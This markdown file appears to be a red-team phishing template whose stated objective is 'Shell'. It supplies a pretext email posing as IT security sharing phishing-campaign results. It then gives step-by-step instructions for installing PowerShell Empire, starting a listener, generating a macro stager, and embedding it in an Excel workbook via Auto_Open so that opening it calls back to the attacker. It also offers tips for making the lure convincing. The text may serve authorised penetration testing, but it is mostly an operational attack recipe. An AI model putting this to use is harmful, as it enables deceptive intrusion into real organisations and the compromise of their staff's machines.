# Phishing Awareness Training Email 

** Objective:** Shell

## Pretext: 
You are an IT Security Manager, or IT Admin who has reciently conducted a phishing awareness campaign against your company. You are asking users to read through the email for phishing awareness and to download and view the results of the phishing campaign. The excel document needs macros enabled to view the results

## To Change:
Create your own macros (Empire is easiest) to call back. 

## Creating a malicious Macros via Empire
1. Installing Empire
  * git clone git@github.com:PowerShellEmpire/Empire.git
  * ./setup/install.sh
2. Starting up a listener:
  * set host <listening host:port>
  * set whatever parameters you want on this, just type 'info'
  * 'execute'
3. Generating the Macro
  * usestager macro
  * set listener <listener number>
  * 'execute'
  * copy the output function
4. Inserting the macro
  * Open Excel > New Document > 'alt+F11' will get you to the macros
  * Double-clck on "This Workbook"
  * Paste in the macro function from Empire
  * Change the Sub call to 'Auto_Open()'
  * Add the line 'Dim str As String' to the top of the Debugging function call before the powershell call.
  * Go back to the spreadsheet and add in whatever content you want. I like to add in random strings and at the top say that macros needs enabled to view the content. Helps with the pretext.
